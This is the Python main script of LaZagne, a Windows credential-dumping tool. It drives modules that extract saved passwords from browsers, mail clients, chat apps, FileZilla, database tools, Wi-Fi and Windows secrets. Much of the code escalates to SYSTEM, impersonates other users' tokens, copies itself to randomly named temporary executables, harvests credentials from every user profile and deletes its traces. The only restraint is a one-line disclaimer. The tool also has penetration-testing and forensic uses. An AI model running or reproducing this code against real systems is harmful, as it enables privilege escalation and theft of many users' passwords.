#!/usr/bin/python

##############################################################################
#                                                                            #
#                           By Alessandro ZANNI                              #
#                                                                            #
##############################################################################

# Disclaimer: Do Not Use this program for illegal purposes ;)
import argparse
import time, sys, os
import logging
import time, tempfile
import shutil
import random
import json
import psutil
import getpass

# Softwares that passwords can be retrieved without needed to be in the user environmment
from lazagne.softwares.browsers.mozilla import Mozilla
from lazagne.softwares.wifi.wifi import Wifi
from lazagne.softwares.windows.secrets import Secrets
from lazagne.softwares.chats.jitsi import Jitsi
from lazagne.softwares.chats.pidgin import Pidgin
from lazagne.softwares.databases.dbvis import Dbvisualizer
from lazagne.softwares.databases.sqldeveloper import SQLDeveloper
from lazagne.softwares.games.kalypsomedia import KalypsoMedia
from lazagne.softwares.games.roguestale import RoguesTale
from lazagne.softwares.sysadmin.filezilla import Filezilla

# Configuration
from lazagne.config.header import Header
from lazagne.config.write_output import write_header, write_footer, print_footer, print_debug, parseJsonResult, parseJsonResultToBuffer, print_output
from lazagne.config.constant import *
from lazagne.config.manageModules import get_categories, get_modules
from lazagne.config.changePrivileges import ListSids, GetUserName, create_proc_as_sid, rev2self, getsystem, isChildProcess, isProcessStillAlive
from lazagne.config.get_system_priv import get_system_priv

category = get_categories()
moduleNames = get_modules()

# Define a dictionary for all modules
modules = {}
for categoryName in category:
	modules[categoryName] = {}

# Add all modules to the dictionary
for module in moduleNames:
	modules[module.category][module.options['dest']] = module
modules['mails']['thunderbird'] = Mozilla(True) # For thunderbird (firefox and thunderbird use the same class)

def output():
	
	if args['write_normal']:
		constant.output = 'txt'
	
	if args['write_json']:
		constant.output = 'json'

	if args['write_all']:
		constant.output = 'all'

	if constant.output:
		if not os.path.exists(constant.folder_name):
			os.makedirs(constant.folder_name)
			# constant.file_name_results = 'credentials' # let the choice of the name to the user
		
		if constant.output != 'json':
			write_header()

	# Remove all unecessary variables
	del args['write_normal']
	del args['write_json']
	del args['write_all']

def verbosity():
	# Write on the console + debug file
	if args['verbose']==0: level=logging.CRITICAL
	elif args['verbose'] == 1: level=logging.INFO
	elif args['verbose']>=2: level=logging.DEBUG
	
	FORMAT = "%(message)s"
	formatter = logging.Formatter(fmt=FORMAT)
	stream = logging.StreamHandler()
	stream.setFormatter(formatter)
	root = logging.getLogger()
	root.setLevel(level)
	# If other logging are set
	for r in root.handlers:
		r.setLevel(logging.CRITICAL)
	root.addHandler(stream)
	del args['verbose']

def launch_module(b):
	ok = False
	modulesToLaunch = []
	# Launch only a specific module
	for i in args:
		if args[i] and i in b:
			modulesToLaunch.append(i)

	# Launch all modules
	if not modulesToLaunch:
		modulesToLaunch = b

	for i in modulesToLaunch:
			Header().title_info(i.capitalize()) 	# print title
			pwdFound = b[i].run(i.capitalize())		# run the module
			print_output(i.capitalize(), pwdFound) 	# print the results

def manage_advanced_options():
	# File used for dictionary attacks
	if 'path' in args:
		constant.path = args['path']
	if 'bruteforce' in args: 
		constant.bruteforce = args['bruteforce']

	# Mozilla advanced options
	if 'manually' in args:
		constant.manually = args['manually']
	if 'specific_path' in args:
		constant.specific_path = args['specific_path']
	
	if 'mails' in args['auditType']:
		constant.mozilla_software = 'Thunderbird'
	elif 'browsers' in args['auditType']:
		constant.mozilla_software = 'Firefox'
	
	# Jitsi advanced options
	if 'master_pwd' in args:
		constant.jitsi_masterpass = args['master_pwd']
	
	# i.e advanced options
	if 'historic' in args:
		constant.ie_historic = args['historic']

# Run only one module
def runModule():
	manage_advanced_options()
	launch_module(modules[args['auditType']])

# Run all
def runAllModules():
	manage_advanced_options()
	for categoryName in category:
		if categoryName == 'browsers':
			constant.mozilla_software = 'Firefox'
		elif categoryName == 'mails':
			constant.mozilla_software = 'Thunderbird'
		launch_module(modules[categoryName])


def childOutput(pid, fileName, isSys):
	while True:
	 	# Wait until the child process died
		if isProcessStillAlive(pid):
			print_debug('INFO', 'The child process is still alive')
			time.sleep(2)

		# The child process died
		else:
			print_debug('INFO', 'The child process has dead')
			if os.path.exists(fileName):
				try:
					with open(fileName, 'r') as jsonFile:
						stdoutRes = json.load(jsonFile)
					if isSys:
						stdoutRes = json.loads(stdoutRes)
					os.remove(fileName)
					return stdoutRes
				except Exception, e:
					print_debug('ERROR', e)
					if os.path.exists(fileName):
						os.remove(fileName)
					return ''
			else:
				print_debug('ERROR', 'Children process did not create a result file')
				return ''

def cleanFileSystem(jsonTmpFile):
	# The sleep is used for waiting child process to end
	print_debug('INFO', '[!] Wait to all child process finish')
	time.sleep(5)

	directory = os.environ['ALLUSERSPROFILE']
	for f in os.listdir(directory):
		if f.startswith('AZA') and f.split(".")[0].endswith('AA'):
			tmpFile = directory + os.sep + f
			try:
				os.remove(tmpFile)
				print_debug('INFO', '[+] Temporary file deleted: %s' % tmpFile)
			except:
				print_debug('INFO', '[-] Failed to delete temporary file: %s' % tmpFile)

		elif jsonTmpFile == directory + os.sep + f:
			try:
				os.remove(jsonTmpFile)
				print_debug('INFO', '[+] Temporary file deleted: %s' % jsonTmpFile)
			except:
				print_debug('INFO', '[-] Failed to delete temporary file: %s' % jsonTmpFile)

# Prompt help if an error occurs
class MyParser(argparse.ArgumentParser):
	def error(self, message):
		sys.stderr.write('error: %s\n\n' % message)
		self.print_help()
		sys.exit(2)


# Print the title
Header().first_title()

parser = MyParser()
parser.add_argument('--version', action='version', version='Version ' + str(constant.CURRENT_VERSION), help='laZagne version')

# ------------------------------------------- Permanent options -------------------------------------------
# Version and verbosity 
PPoptional = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
PPoptional._optionals.title = 'optional arguments'
PPoptional.add_argument('-v', dest='verbose', action='count', default=0, help='increase verbosity level')
PPoptional.add_argument('-path', dest='path',  action= 'store', help = 'path of a file used for dictionary file')
PPoptional.add_argument('-b', dest='bruteforce',  action= 'store', help = 'number of character to brute force')

# Output 
PWrite = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
PWrite._optionals.title = 'Output'
PWrite.add_argument('-oN', dest='write_normal',  action='store_true', help = 'output file in a readable format')
PWrite.add_argument('-oJ', dest='write_json',  action='store_true', help = 'output file in a json format')
PWrite.add_argument('-oA', dest='write_all',  action='store_true', help = 'output file in all format')

# ------------------------------------------- Add options and suboptions to all modules -------------------------------------------
all_subparser = []
for c in category:
	category[c]['parser'] = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
	category[c]['parser']._optionals.title = category[c]['help']
	
	# Manage options
	category[c]['subparser'] = []
	for module in modules[c].keys():
		m = modules[c][module]
		category[c]['parser'].add_argument(m.options['command'], action=m.options['action'], dest=m.options['dest'], help=m.options['help'])
		
		# Manage all suboptions by modules
		if m.suboptions and m.name != 'thunderbird':
			tmp = []
			for sub in m.suboptions:
				tmp_subparser = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
				tmp_subparser._optionals.title = sub['title']
				if 'type' in sub:
					tmp_subparser.add_argument(sub['command'], type=sub['type'], action=sub['action'], dest=sub['dest'], help=sub['help'])
				else:
					tmp_subparser.add_argument(sub['command'], action=sub['action'], dest=sub['dest'], help=sub['help'])
				tmp.append(tmp_subparser)
				all_subparser.append(tmp_subparser)
			category[c]['subparser'] += tmp

# ------------------------------------------- Print all -------------------------------------------
parents = [PPoptional] + all_subparser + [PWrite]
dic = {'all':{'parents':parents, 'help':'Run all modules', 'func': runAllModules}}
for c in category:
	parser_tab = [PPoptional, category[c]['parser']]
	if 'subparser' in category[c]:
		if category[c]['subparser']:
			parser_tab += category[c]['subparser']
	parser_tab += [PWrite]
	dic_tmp = {c: {'parents': parser_tab, 'help':'Run %s module' % c, 'func': runModule}}
	dic = dict(dic.items() + dic_tmp.items())

#2- Main commands
subparsers = parser.add_subparsers(help='Choose a main command')
for d in dic:
	subparsers.add_parser(d,parents=dic[d]['parents'],help=dic[d]['help']).set_defaults(func=dic[d]['func'],auditType=d)

# ------------------------------------------- Parse arguments -------------------------------------------
args = dict(parser.parse_args()._get_kwargs())
arguments = parser.parse_args()
start_time = time.time()
output()
verbosity()

# ------ Part used for user impersonation ------ 

currentUser = getpass.getuser()
argv = vars(arguments)['auditType']
current_filepath = sys.argv[0]
sids = ListSids()
isSystem = False
stopExecute = True
isChild = isChildProcess(current_filepath)

# File used to store output for all impersonated user
tmpFile = os.environ['ALLUSERSPROFILE'] + os.sep + 'JANQT1AD.json'

# Force a child process to write its result to a specific folder
if isChild:
	constant.folder_name = os.environ['ALLUSERSPROFILE']
	constant.file_name_results = 'JANQT1AD'

# Check if we have system privileges
for sid in sids:
	if sid[0] == os.getpid():		
		if sid[2] == "S-1-5-18":
			isSystem = True

end = False
stdoutRes = []

# System privileges
if isSystem:
	try:
		randomName = ''.join(random.choice("aABCDEFGHIJKLMNOPqrstuvWxYz") for i in range(3))
		dst = os.environ['ALLUSERSPROFILE'] + os.sep + 'AZA' + randomName + 'AA' + '.exe'
		shutil.copyfile(current_filepath, dst)
	except:
		end = True
	
	if not end:
		
		# Get a list of user we could impersonate from token
		impersonateUsers = {}
		impersonated_user = []
		for sid in sids:
			if ' NT' not in sid[3].split('\\')[0] and 'NT ' not in sid[3].split('\\')[0] and 'Window' not in sid[3].split('\\')[0]:
				if sid[3] not in impersonateUsers.keys():
					impersonateUsers[sid[3]] = []
				impersonateUsers[sid[3]].append(sid[2])

		# Impersonate an user
		try:
			for users in impersonateUsers.keys():
				print_debug('INFO', '[!] Impersonate token user of %s' % users.encode('utf-8'))
				for sid in impersonateUsers[users]:
					try:
						pid = int(create_proc_as_sid(sid, "cmd.exe /c %s %s" % (dst, argv)))

						# Wait for the child process to end and keep the output into the stdoutRes variable
						stdoutRes.append(childOutput(pid, tmpFile, True))
						
						# Store user when the impersonation succeed
						try:
							impersonated_user.append(users.split('\\')[1])
						except:
							pass
						
						rev2self()
						break
					except Exception,e:
						print_debug('ERROR', e)
						pass
		except (KeyboardInterrupt, SystemExit):
			print_debug('INFO', 'Keyboard interrupt. Cleaning Up')
			try:
				print_debug('INFO', '[!] Killing child process')
				p = psutil.Process(pid)
				p.kill()
				print_debug('INFO', '[+] Child process killed')
			except:
				pass

			cleanFileSystem(tmpFile)
			sys.exit()

		# Clean file used for impersonation
		os.remove(dst)

	# Check users existing on the system 
	all_users = os.listdir('C:\\Users')
	
	# Removing all files
	for dir_users in all_users:
		if os.path.isfile('C:\\Users\\%s' % dir_users):
			all_users.remove(dir_users)

	# Removing all default directory
	if 'All Users' in all_users:
	 	all_users.remove('All Users')
	if 'Default User' in all_users:
	 	all_users.remove('Default User')
	if 'Default' in all_users:
	 	all_users.remove('Default')
	if 'Public' in all_users:
	 	all_users.remove('Public')

	# Removing user that have already been impersonated
	for imper_user in impersonated_user:
		if imper_user in all_users:
			all_users.remove(imper_user)

	# Ready to check for all users remaining
	user_pwd_temp = []
	for user_selected in all_users:
		print_debug('INFO', '[!] Trying to impersonate user: %s' % user_selected)
		print '\n\n########## User: %s ##########\n' % user_selected
		
		# Fix value by default for user environnment (appdata and userprofile)
		constant.userprofile = 'C:\\Users\\%s\\' % user_selected
		constant.appdata = 'C:\\Users\\%s\\AppData\\Roaming\\' % user_selected

		# if isChild:
		constant.finalResults = {}
		constant.finalResults['User'] = user_selected
		
		# Try to retrieve all passwords from lazagne.softwares which do not need to be in the user session
		constant.mozilla_software = 'Firefox'
		Mozilla(False).run()
		constant.mozilla_software = 'Thunderbird'
		Mozilla(True).run()
		Jitsi().run()
		Pidgin().run()
		Dbvisualizer().run()
		SQLDeveloper().run()
		KalypsoMedia().run()
		RoguesTale().run()
		Filezilla().run()
		
		if isChild:
			stdoutRes.append(constant.finalResults)
		
		# Used to write the passwords found into the json - txt file
		else:
			user_pwd_temp.append(constant.finalResults)

	constant.finalResults = {}
	constant.finalResults['User'] = "SYSTEM"
	
	# Is a child process
	if isChild:
		constant.output = 'json'
		try:
			if "windows" in argv or "all" in argv:
				Secrets().run()
				
			elif "wifi" in argv or "all" in argv:
				pwdFound = Wifi().run()
				print_output('Wifi', pwdFound)
		except Exception,e:
			print_debug('ERROR', e)
			pass
		stdoutRes.append(constant.finalResults)
		
		# Write output to a tmp file
		with open(tmpFile, "w+") as f:
			json.dump(stdoutRes, f)
	
	# Is not a child process
	else:
		# Print the entire output of children results
		parseJsonResult(stdoutRes)

		# Get all privilege passwords
		print '\n\n########## User: SYSTEM ##########\n' 
		try:
			if "windows" in argv or "all" in argv:
				Secrets().run()
				
			elif "wifi" in argv or "all" in argv:
				pwdFound = Wifi().run()
				print_output('Wifi', pwdFound)
			stdoutRes.append(constant.finalResults)
		except Exception,e:
			print_debug('ERROR', e)
			pass

		try:
			stdoutRes += user_pwd_temp
			if constant.output == 'json' or constant.output == 'all':
				with open(constant.folder_name + os.sep + constant.file_name_results + '.json', 'w') as f:
					json.dump(json.dumps(stdoutRes), f)
				print '[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.json'

			# Write to a txt file
			if constant.output != 'json':
				with open(constant.folder_name + os.sep + constant.file_name_results + '.txt', 'a+b') as f:
					f.write(parseJsonResultToBuffer(stdoutRes).encode('utf-8'))
				print '[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.txt'

		except Exception as e:
			print_debug('ERROR', 'Error writing the output file: %s' % e)

else:
	if isChild:
		# - Normal execution
		# - Redirect output to a temp file
		# - Quit
		constant.output = 'json'
		stopExecute = False
	else:
		print_debug('INFO', 'We do not have system privileges')
		
		try:
			randomName = ''.join(random.choice("aABCDEFGHIJKLMNOPqrstuvWxYz") for i in range(5))
			dst = os.environ['ALLUSERSPROFILE'] + os.sep + 'AZA' + randomName + 'AA' + '.exe'	
			shutil.copyfile(current_filepath, dst)

			# Trying to get system
			print_debug('INFO', 'Trying to get system')
			pid = int(getsystem("cmd.exe /c %s %s" % (dst, argv)))
			print_debug('INFO', 'Get system privileges, waiting for impersonation process')
			
			# Wait for the child process to end and keep the output into a variable and print it
			chld = childOutput(pid, tmpFile, False)

			# Print final result
			parseJsonResult(chld)

			try:
				if constant.output == 'json' or constant.output == 'all':
					with open(constant.folder_name + os.sep + constant.file_name_results + '.json', 'w') as f:
						json.dump(json.dumps(chld), f)
					print '[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.json'

				# Write to a txt file
				if constant.output != 'json':
					with open(constant.folder_name + os.sep + constant.file_name_results + '.txt', 'a+b') as f:
						f.write(parseJsonResultToBuffer(chld).encode('utf-8'))
					print '[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.txt'

			except Exception as e:
				print_debug('ERROR', 'Error writing the output file: %s' % e)

			# Clean
			os.remove(dst)
			rev2self()
		except Exception as e:
			print_debug('WARNING', 'Not enough privileges to get system rights: %s' % e)
			# Is not system and is not elevated
			# Realize a normal execution
			stopExecute = False
		except (KeyboardInterrupt, SystemExit):
			print_debug('INFO', 'Keyboard interrupt. Cleaning Up')
			try:
				print_debug('INFO', '[!] Killing child process')
				p = psutil.Process(pid)
				p.kill()
				print_debug('INFO', '[+] Child process killed')
			except:
				pass
			cleanFileSystem(tmpFile)
			sys.exit()
 
# ------ End of user impersonation ------ 

if not stopExecute:
	print '\n\n########## User: %s ##########\n' % currentUser
	constant.finalResults['User'] = currentUser
	arguments.func()

	if constant.output == 'json' or constant.output == 'all':
		if isChild:
			with open(constant.folder_name + os.sep + constant.file_name_results + '.json', 'w') as f:
				json.dump(json.dumps(constant.finalResults), f)
		
		# Human readable Json format 
		else:
			prettyJson = json.dumps(constant.finalResults, sort_keys=True, indent=4, separators=(',', ': '))
			with open(constant.folder_name + os.sep + constant.file_name_results + '.json', 'w+') as f:
				json.dump(prettyJson, f)
			print '[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.json'

	# Print the number of passwords found
	if constant.output == 'txt' or constant.output == 'all':
		tmp_dic = [constant.finalResults]
		with open(constant.folder_name + os.sep + constant.file_name_results + '.txt', 'a+b') as f:
			f.write(parseJsonResultToBuffer(tmp_dic))
		write_footer()
		print '[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.txt'

	print_footer()

elapsed_time = time.time() - start_time
print '\nelapsed time = ' + str(elapsed_time)
